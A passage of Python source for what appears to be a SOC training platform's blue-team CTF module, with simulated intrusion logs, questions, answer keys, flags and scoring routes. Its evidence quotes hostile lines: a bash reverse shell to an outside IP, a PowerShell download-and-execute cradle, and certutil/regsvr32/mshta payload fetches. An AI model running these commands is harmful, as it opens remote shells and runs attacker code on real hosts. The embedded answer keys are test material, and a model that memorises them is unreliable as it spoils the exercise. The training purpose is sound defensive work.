            {"id":"q2","text":"What registry key was modified to establish persistence?","answer":"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","accept":["currentversion\\run","currentversion/run","hkcu run","run key","software\\microsoft\\windows\\currentversion\\run"]},
            {"id":"q3","text":"What two tools were used to destroy backups before encryption?","answer":"vssadmin and wbadmin","accept":["vssadmin and wbadmin","vssadmin wbadmin","vssadmin, wbadmin"]},
            {"id":"q4","text":"What file extension were encrypted files given?","answer":".locked","accept":[".locked","locked"]},
            {"id":"q5","text":"What is the name of the ransom note file?","answer":"README_DECRYPT.txt","accept":["readme_decrypt.txt","README_DECRYPT.txt","readme_decrypt","decrypt"]},
        ],
        "_flag": "FLAG{ransomware_ps_bypass_vssadmin_locked_extension_run_key}",
        "hint1": "The -enc flag in PowerShell means the command is base64 encoded — a common obfuscation technique.",
        "hint2": "Ransomware always destroys backups before encrypting. Look for vss and wbadmin commands.",
        "hint1_cost": 20, "hint2_cost": 30,
    },
    {
        "id": "MI-002",
        "category": "Malware Indicators",
        "title": "DNS Decoder",
        "difficulty": "hard",
        "points": 350,
        "description": (
            "A workstation is exfiltrating data through DNS. The malware encodes stolen data "
            "into subdomain labels of DNS queries. Decode the traffic and identify what's being stolen."
        ),
        "evidence": {
            "packets": [
                {"no":1,"time":"11:30:01","src":"192.168.1.40","dst":"8.8.8.8","proto":"DNS","len":98,"info":"Query: aGVsbG8gd29ybGQ=.exfil-c2.xyz TXT"},
                {"no":2,"time":"11:30:03","src":"192.168.1.40","dst":"8.8.8.8","proto":"DNS","len":102,"info":"Query: dXNlcm5hbWU6YWRtaW4=.exfil-c2.xyz TXT"},
                {"no":3,"time":"11:30:05","src":"192.168.1.40","dst":"8.8.8.8","proto":"DNS","len":108,"info":"Query: cGFzc3dvcmQ6U3VwZXJTM2NyZXQh.exfil-c2.xyz TXT"},
                {"no":4,"time":"11:30:07","src":"192.168.1.40","dst":"8.8.8.8","proto":"DNS","len":99,"info":"Query: aG9zdG5hbWU6V09SS1NUQVRJT04tQg==.exfil-c2.xyz TXT"},
                {"no":5,"time":"11:30:09","src":"192.168.1.40","dst":"8.8.8.8","proto":"DNS","len":95,"info":"Query: aXA6MTkyLjE2OC4xLjQw.exfil-c2.xyz TXT"},
            ],
            "notes": "All queries are for TXT records. The subdomain labels appear to be base64-encoded strings.",
            "decode_hint": "Base64 decode the subdomain portion of each query (the part before .exfil-c2.xyz).",
        },
        "questions": [
            {"id":"q1","text":"What encoding is used in the subdomain labels?","answer":"base64","accept":["base64","base 64","b64"]},
            {"id":"q2","text":"Decode query #2. What credential is being exfiltrated? (format: field:value)","answer":"username:admin","accept":["username:admin","username: admin"]},
            {"id":"q3","text":"Decode query #3. What is the password being stolen?","answer":"SuperS3cret!","accept":["SuperS3cret!","supers3cret!","SuperS3cret"]},
            {"id":"q4","text":"What C2 domain is receiving the exfiltrated data?","answer":"exfil-c2.xyz","accept":["exfil-c2.xyz","*.exfil-c2.xyz"]},
            {"id":"q5","text":"What MITRE sub-technique ID covers DNS-based exfiltration?","answer":"T1048.001","accept":["t1048.001","T1048.001","t1048","T1048"]},
        ],
        "_flag": "FLAG{dns_tunnel_b64_creds_exfil_SuperS3cret_T1048}",
        "hint1": "Use a base64 decoder (CyberChef, Python, or atob() in browser console) on each subdomain.",
        "hint2": "T1048 is Exfiltration Over Alternative Protocol. The .001 sub-technique is specifically for symmetric encrypted/encoded channels.",
        "hint1_cost": 30, "hint2_cost": 45,
    },

    # ── CATEGORY: Incident Response ───────────────────────────────────────────
    {
        "id": "IR-001",
        "category": "Incident Response",
        "title": "Timeline Reconstructor",
        "difficulty": "medium",
        "points": 250,
        "description": (
            "A full intrusion occurred over 4 hours. Using the mixed evidence below, "
            "reconstruct the attack timeline and identify each kill chain stage."
        ),
        "evidence": {
            "logs": [
                "[FIREWALL]  07:14:02  ALLOW TCP 91.108.4.21 → 192.168.1.10:80  SYN",
                "[WEBSERVER] 07:14:04  POST /contact.php — 91.108.4.21 — 200 OK — 8847 bytes returned",
                "[WEBSERVER] 07:14:04  PHP ERROR: system() call in /var/www/html/uploads/img001.php",
                "[SYSLOG]    07:14:09  useradd: new user 'svc_update' added to /etc/passwd",
                "[SYSLOG]    07:14:11  svc_update added to sudoers",
                "[NETWORK]   07:22:17  OUTBOUND TCP 192.168.1.10 → 185.220.101.47:4444",
                "[SYSLOG]    07:22:19  svc_update ran: /bin/bash -i >& /dev/tcp/185.220.101.47/4444 0>&1",
                "[NETWORK]   07:22:19  ESTABLISHED session 192.168.1.10 ↔ 185.220.101.47:4444",
                "[SYSLOG]    08:01:44  svc_update: nmap -sn 192.168.1.0/24 (internal recon)",
                "[SYSLOG]    08:04:12  svc_update: ssh deploy@192.168.1.20 (key-based auth, success)",
                "[FILESERVER]08:04:45  COPY \\HR\\personnel-data.zip → /tmp/out.zip (192.168.1.20)",
                "[NETWORK]   08:09:33  OUTBOUND HTTPS 192.168.1.20 → 104.21.45.89:443 — 47MB",
                "[SYSLOG]    11:02:55  crontab installed: */10 * * * * /tmp/.svc_update/beacon.sh",
            ]
        },
        "questions": [
            {"id":"q1","text":"What was the initial access vector? (two words)","answer":"web shell","accept":["web shell","webshell","php webshell","php shell","file upload"]},
            {"id":"q2","text":"What backdoor account was created for persistence?","answer":"svc_update","accept":["svc_update","svc update"]},
            {"id":"q3","text":"What port was the reverse shell callback on?","answer":"4444","accept":["4444","port 4444"]},
            {"id":"q4","text":"How did the attacker pivot to the file server? (two words)","answer":"ssh key","accept":["ssh key","ssh keys","key-based ssh","ssh key auth","key auth","ssh"]},
            {"id":"q5","text":"How many MB were exfiltrated? (from the network log)","answer":"47","accept":["47","47mb","47 mb"]},
        ],
        "_flag": "FLAG{IR_webshell_svc_update_4444_ssh_pivot_47MB_exfil}",
        "hint1": "Follow the timestamps — the attack has 5 clear phases matching the kill chain.",
        "hint2": "The pivot to the file server used a different authentication method than password-based SSH.",
        "hint1_cost": 20, "hint2_cost": 35,
    },
    {
        "id": "IR-002",
        "category": "Incident Response",
        "title": "Contain and Eradicate",
        "difficulty": "hard",
        "points": 400,
        "description": (
            "A compromised host has been identified. You must answer the IR team's containment "
            "and eradication questions correctly to close the ticket. All answers come from "
            "the forensic artefacts below."
        ),
        "evidence": {
            "logs": [
                "=== PROCESS LIST (at time of detection) ===",
                "PID 4    System",
                "PID 892  svchost.exe  (legitimate)",
                "PID 1204 explorer.exe (legitimate)",
                "PID 2847 chrome.exe   (legitimate)",
                "PID 3102 svchost32.exe  C:\\Users\\jsmith\\AppData\\Roaming\\svchost32.exe  [SUSPICIOUS - not system32]",
                "PID 3210 cmd.exe      Parent: svchost32.exe",
                "PID 3301 beacon.sh    Parent: svchost32.exe  [via wsl.exe]",
                "",
                "=== NETWORK CONNECTIONS (active) ===",
                "svchost32.exe  TCP  192.168.1.30:51204 → 185.220.101.47:443  ESTABLISHED",
                "",
                "=== PERSISTENCE MECHANISMS FOUND ===",
                "1. HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run: svchost32.exe",
                "2. C:\\Users\\jsmith\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svc32.lnk",
                "3. Scheduled Task: \\Microsoft\\Windows\\svchost_update  runs every 15 min",
                "",
                "=== FILE HASHES ===",
                "svchost32.exe  MD5: 5f4dcc3b5aa765d61d8327deb882cf99",
                "beacon.sh      MD5: 098f6bcd4621d373cade4e832627b4f6",
                "",
                "=== REGISTRY AUTORUNS ===",
                "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend: START=4 (disabled!)",
            ]
        },
        "questions": [
            {"id":"q1","text":"What is the name of the malicious process? (filename)","answer":"svchost32.exe","accept":["svchost32.exe","svchost32"]},
            {"id":"q2","text":"How many distinct persistence mechanisms must be removed to eradicate the malware?","answer":"3","accept":["3","three"]},
            {"id":"q3","text":"What defender capability did the attacker disable? (one word)","answer":"windefend","accept":["windefend","windows defender","defender","antivirus","av"]},
            {"id":"q4","text":"What is the C2 IP address the malware is beaconing to?","answer":"185.220.101.47","accept":["185.220.101.47"]},
            {"id":"q5","text":"What is the first containment action you should take? (two words)","answer":"isolate host","accept":["isolate host","network isolation","isolate workstation","disconnect network","network isolate","block c2"]},
        ],
        "_flag": "FLAG{IR_contain_svchost32_3_persistence_disable_defender_isolate}",
        "hint1": "Count every location where the malware would survive a reboot.",
        "hint2": "The registry shows a service with START=4 — look up what that value means.",
        "hint1_cost": 30, "hint2_cost": 45,
    },

    # ── CATEGORY: Threat Hunting ─────────────────────────────────────────────
    {
        "id": "TH-001",
        "category": "Threat Hunting",
        "title": "Living off the Land",
        "difficulty": "medium",
        "points": 250,
        "description": (
            "An EDR alert fired on 'unusual parent process'. The attacker is using Windows "
            "built-in tools (LOLBins) to avoid detection. Identify the technique and tools used."
        ),
        "evidence": {
            "logs": [
                "EventID:4688 winword.exe spawned cmd.exe  [UNUSUAL PARENT]",
                "EventID:4688 cmd.exe spawned powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.45/stage2.ps1')\"",
                "EventID:4688 powershell.exe spawned certutil.exe -urlcache -split -f http://185.220.101.45/payload.exe C:\\Windows\\Temp\\svc.exe",
                "EventID:4688 powershell.exe spawned regsvr32.exe /s /n /u /i:http://185.220.101.45/payload.sct scrobj.dll",
                "EventID:4688 powershell.exe spawned mshta.exe http://185.220.101.45/payload.hta",
                "EventID:3    powershell.exe TCP 192.168.1.30 → 185.220.101.45:80 ESTABLISHED",
                "EventID:4688 powershell.exe spawned schtasks.exe /create /sc minute /mo 5 /tn svcupdate /tr C:\\Windows\\Temp\\svc.exe",
            ]
        },
        "questions": [
            {"id":"q1","text":"What was the initial infection vector (what application was exploited)?","answer":"microsoft word","accept":["microsoft word","word","winword","winword.exe","ms word"]},
            {"id":"q2","text":"What LOLBin was used to download a file from the internet? (executable name only)","answer":"certutil.exe","accept":["certutil.exe","certutil"]},
            {"id":"q3","text":"What PowerShell technique downloads and executes a remote script in memory?","answer":"IEX","accept":["iex","invoke-expression","IEX","invoke expression"]},
            {"id":"q4","text":"What scheduled task name was created for persistence?","answer":"svcupdate","accept":["svcupdate","svc update","svc_update"]},
            {"id":"q5","text":"What MITRE technique covers the use of built-in OS tools to evade detection? (Txxxx)","answer":"T1218","accept":["T1218","t1218","lolbins","living off the land"]},
        ],
        "_flag": "FLAG{LOLBin_certutil_IEX_regsvr32_mshta_T1218_svcupdate}",
        "hint1": "LOLBins = Living Off the Land Binaries — legitimate Windows tools abused by attackers to blend in.",
        "hint2": "IEX in PowerShell stands for Invoke-Expression. Combined with DownloadString it's a common fileless technique.",
        "hint1_cost": 20, "hint2_cost": 30,
    },
    {
        "id": "TH-002",
        "category": "Threat Hunting",
        "title": "The Phantom Account",
        "difficulty": "hard",
        "points": 400,
        "description": (
            "During a routine hunt, an analyst noticed an account that shouldn't exist. "
            "Piece together how it was created, what it was used for, and how it was hidden."
        ),
        "evidence": {
            "logs": [
                "=== ACTIVE DIRECTORY EVENTS ===",
                "2024-11-13 02:44:12 EventID:4720 User account created: svc_telemetry$ (note the $)",
                "2024-11-13 02:44:13 EventID:4728 svc_telemetry$ added to group: Domain Admins",
                "2024-11-13 02:44:14 EventID:4738 User account changed: svc_telemetry$ — Password never expires: TRUE",
                "2024-11-13 02:44:15 EventID:4738 User account changed: svc_telemetry$ — Account hidden from standard queries: TRUE",
                "",
                "=== AUTHENTICATION LOGS ===",
                "2024-11-14 03:12:44 EventID:4624 Logon Type:3 svc_telemetry$ → DC01 (domain controller)",
                "2024-11-14 03:12:47 EventID:4776 Kerberos TGT issued for svc_telemetry$",
                "2024-11-14 03:13:01 EventID:4624 Logon Type:3 svc_telemetry$ → FILE-SERVER (admin share)",
                "2024-11-14 03:13:04 EventID:4624 Logon Type:3 svc_telemetry$ → WORKSTATION-ALPHA",
                "",
                "=== NETWORK ===",
                "2024-11-14 03:13:10 svc_telemetry$ ran: net user svc_telemetry$ /domain (verify own existence)",
                "2024-11-14 03:13:22 dcsync traffic: svc_telemetry$ requested replication from DC01 (all hashes)",
            ]
        },
        "questions": [
            {"id":"q1","text":"At what time (HH:MM) was the phantom account created?","answer":"02:44","accept":["02:44","2:44","02:44:12"]},
            {"id":"q2","text":"What high-privilege group was the account added to?","answer":"domain admins","accept":["domain admins","domain administrators","admins"]},
            {"id":"q3","text":"The account name ends with $. What type of Windows account does this typically indicate?","answer":"service account","accept":["service account","computer account","machine account","managed service account","service"]},
            {"id":"q4","text":"What advanced technique did the attacker use to steal all password hashes from the domain? (two words)","answer":"dcsync","accept":["dcsync","dc sync","dcsync attack","dcsync technique"]},
            {"id":"q5","text":"What MITRE technique ID covers credential dumping via directory replication?","answer":"T1003.006","accept":["t1003.006","T1003.006","t1003","T1003","dcsync"]},
        ],
        "_flag": "FLAG{phantom_account_domain_admins_dcsync_T1003_006_all_hashes}",
        "hint1": "The $ suffix makes the account look like a computer account in standard AD queries — a common hiding technique.",
        "hint2": "DCSync abuses Active Directory replication rights to request password hashes for any account — no code runs on the DC.",
        "hint1_cost": 30, "hint2_cost": 50,
    },
]

# ── CTF session state ─────────────────────────────────────────────────────────
ctf_session = {
    "started": False,
    "start_time": None,
    "total_points": 0,
    "challenges": {},  # id -> {solved, points_earned, hints_used, answers, start_time}
}

def ctf_challenge_state(ch_id):
    """Get or initialise per-challenge state."""
    if ch_id not in ctf_session["challenges"]:
        ctf_session["challenges"][ch_id] = {
            "solved": False,
            "points_earned": 0,
            "hints_used": [],
            "answers": {},       # question_id -> True/False
            "start_time": None,
        }
    return ctf_session["challenges"][ch_id]

def normalise(s):
    """Lowercase, strip, collapse whitespace for answer comparison."""
    return " ".join(s.lower().strip().split())

# ── CTF API ───────────────────────────────────────────────────────────────────

@app.route("/api/ctf/challenges")
def ctf_list():
    """Return challenge list — NO flags, NO answers."""
    result = []
    for ch in CTF_CHALLENGES:
        st = ctf_challenge_state(ch["id"])
        total_q  = len(ch["questions"])
        answered = sum(1 for v in st["answers"].values() if v)
        result.append({
            "id": ch["id"],
            "category": ch["category"],
            "title": ch["title"],
            "difficulty": ch["difficulty"],
            "points": ch["points"],
            "description": ch["description"],
            "evidence": ch["evidence"],
            "questions": [{"id": q["id"], "text": q["text"]} for q in ch["questions"]],
            "hint1_cost": ch["hint1_cost"],
            "hint2_cost": ch["hint2_cost"],
            "solved": st["solved"],
            "points_earned": st["points_earned"],
            "hints_used": st["hints_used"],
            "answers": st["answers"],
            "total_questions": total_q,
            "answered_correctly": answered,
        })
    return jsonify(result)

@app.route("/api/ctf/hint", methods=["POST"])
def ctf_hint():
    data = request.json or {}
    ch_id = data.get("challenge_id")
    hint_num = data.get("hint_num", 1)  # 1 or 2
    ch = next((c for c in CTF_CHALLENGES if c["id"] == ch_id), None)
    if not ch:
        return jsonify({"error": "Challenge not found"}), 404
    st = ctf_challenge_state(ch_id)
    if st["solved"]:
        return jsonify({"error": "Already solved"}), 400
    key = f"hint{hint_num}"
    if key in st["hints_used"]:
        # Already bought — just return it again
        return jsonify({"hint": ch[key], "cost": 0, "already_purchased": True})
    cost = ch[f"hint{hint_num}_cost"]
    hint_text = ch[key]
    st["hints_used"].append(key)
    return jsonify({"hint": hint_text, "cost": cost, "already_purchased": False})

@app.route("/api/ctf/answer", methods=["POST"])
def ctf_answer():
    data = request.json or {}
    ch_id   = data.get("challenge_id")
    q_id    = data.get("question_id")
    answer  = data.get("answer", "").strip()
    ch = next((c for c in CTF_CHALLENGES if c["id"] == ch_id), None)
    if not ch:
        return jsonify({"error": "Challenge not found"}), 404
    st = ctf_challenge_state(ch_id)
    if st["solved"]:
        return jsonify({"already_solved": True, "flag": ch["_flag"]})
    if not st["start_time"]:
        st["start_time"] = datetime.now()
    q = next((q for q in ch["questions"] if q["id"] == q_id), None)
    if not q:
        return jsonify({"error": "Question not found"}), 404

    accepted = [normalise(a) for a in q["accept"]]
    correct  = normalise(answer) in accepted

    st["answers"][q_id] = correct

    # Check if ALL questions now answered correctly
    all_correct = all(st["answers"].get(qq["id"], False) for qq in ch["questions"])
    flag = None
    points_earned = 0
    if all_correct and not st["solved"]:
        st["solved"] = True
        # Time bonus: full points if < 10 min, scaled down to 60% at 30 min
        elapsed = (datetime.now() - st["start_time"]).total_seconds() if st["start_time"] else 600
        hint_penalty = sum(
            ch.get(f"hint{n}_cost", 0) for n in [1, 2] if f"hint{n}" in st["hints_used"]
        )
        time_bonus_pct = max(0.6, 1.0 - max(0, elapsed - 600) / 7200)
        raw = int(ch["points"] * time_bonus_pct)
        points_earned = max(int(ch["points"] * 0.4), raw - hint_penalty)
        st["points_earned"] = points_earned
        ctf_session["total_points"] += points_earned
        ctf_session["started"] = True
        flag = ch["_flag"]
        # Award analyst XP too
        analyst_session["xp"] += points_earned
        check_missions()

    return jsonify({
        "correct": correct,
        "question_id": q_id,
        "solved": st["solved"],
        "flag": flag,
        "points_earned": points_earned,
        "answers": st["answers"],
        "all_correct": all_correct,
        "total_questions": len(ch["questions"]),
        "answered_correctly": sum(1 for v in st["answers"].values() if v),
    })

@app.route("/api/ctf/scoreboard")
def ctf_scoreboard():
    solved   = [c for c in CTF_CHALLENGES if ctf_challenge_state(c["id"])["solved"]]
    unsolved = [c for c in CTF_CHALLENGES if not ctf_challenge_state(c["id"])["solved"]]
    by_cat   = {}
    for ch in CTF_CHALLENGES:
        cat = ch["category"]
        st  = ctf_challenge_state(ch["id"])
        if cat not in by_cat:
            by_cat[cat] = {"solved": 0, "total": 0, "points": 0, "max_points": 0}
        by_cat[cat]["total"] += 1
        by_cat[cat]["max_points"] += ch["points"]
        if st["solved"]:
            by_cat[cat]["solved"] += 1
            by_cat[cat]["points"] += st["points_earned"]
    return jsonify({
        "total_points": ctf_session["total_points"],
        "solved_count": len(solved),
        "total_count": len(CTF_CHALLENGES),
        "max_points": sum(c["points"] for c in CTF_CHALLENGES),
        "by_category": by_cat,
    })

@app.route("/api/ctf/reset", methods=["POST"])
def ctf_reset():
    ctf_session["total_points"] = 0
    ctf_session["started"] = False
    ctf_session["start_time"] = None
    ctf_session["challenges"] = {}
    return jsonify({"success": True})


@app.route("/")
def index():
    with open(os.path.join(BASE_DIR,"dashboard.html"),"r",encoding="utf-8") as f: return f.read()

if __name__=="__main__":
    print("""
╔══════════════════════════════════════════════════════╗
║       HomeSIEM v3 — SOC Training Platform            ║
║  Dashboard: http://localhost:5001                    ║
╚══════════════════════════════════════════════════════╝
    """)
    threading.Thread(target=simulate_normal_traffic,daemon=True).start()
    app.run(host="127.0.0.1",port=5001,debug=False)
